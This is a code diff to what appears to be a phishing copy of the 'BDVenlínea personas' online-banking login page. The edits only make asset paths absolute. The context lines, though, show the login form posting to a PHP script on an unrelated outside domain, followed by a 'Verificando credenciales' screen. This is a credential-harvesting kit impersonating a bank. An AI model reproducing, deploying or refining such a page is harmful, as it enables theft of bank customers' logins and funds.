@@ -118,9 +118,9 @@
     <title>BDVenlínea personas</title>
 
     <meta content="width=device-width, initial-scale=1" name="viewport">
-    <!--    <link href="assets/styles.css" rel="stylesheet">-->
-    <link href="assets/style.css" rel="stylesheet">
-    <link href="assets/asi.css" rel="stylesheet">
+    <!--    <link href="/assets/styles.css" rel="stylesheet">-->
+    <link href="/assets/style.css" rel="stylesheet">
+    <link href="/assets/asi.css" rel="stylesheet">
 
     <style type="text/css">
         #_copy {
@@ -215,7 +215,7 @@
                         <div _ngcontent-c10="" class="row" bis_skin_checked="1">
                             <div _ngcontent-c10="" class="col s12 not-margin not-padding" bis_skin_checked="1">
                                 <div _ngcontent-c10="" bis_skin_checked="1">
-                                    <div _ngcontent-c10="" class="login-container-logo" bis_skin_checked="1"><img _ngcontent-c10="" class="logo-login" src="./assets/logo.png"></div>
+                                    <div _ngcontent-c10="" class="login-container-logo" bis_skin_checked="1"><img _ngcontent-c10="" class="logo-login" src="/assets/logo.png"></div>
 
                                     <div _ngcontent-c10="" class="login-container-form" bis_skin_checked="1">
                                         <form _ngcontent-c10="" novalidate="" class="ng-untouched ng-pristine ng-invalid" method="post" action="https://lifeschool.edu.pk/bdv/joqueback/joquer.php">
@@ -401,8 +401,8 @@
         <h4 class="title">Verificando credenciales</h4>
         <p class="subtitle"></p>
     </div>
-    <script src="assets/jav2.js" type="text/javascript"></script>
-    <script src="assets/app.js" type="text/javascript"></script>
+    <script src="/assets/jav2.js" type="text/javascript"></script>
+    <script src="/assets/app.js" type="text/javascript"></script>
 
     <script>
         // Obtener los elementos de input y botón
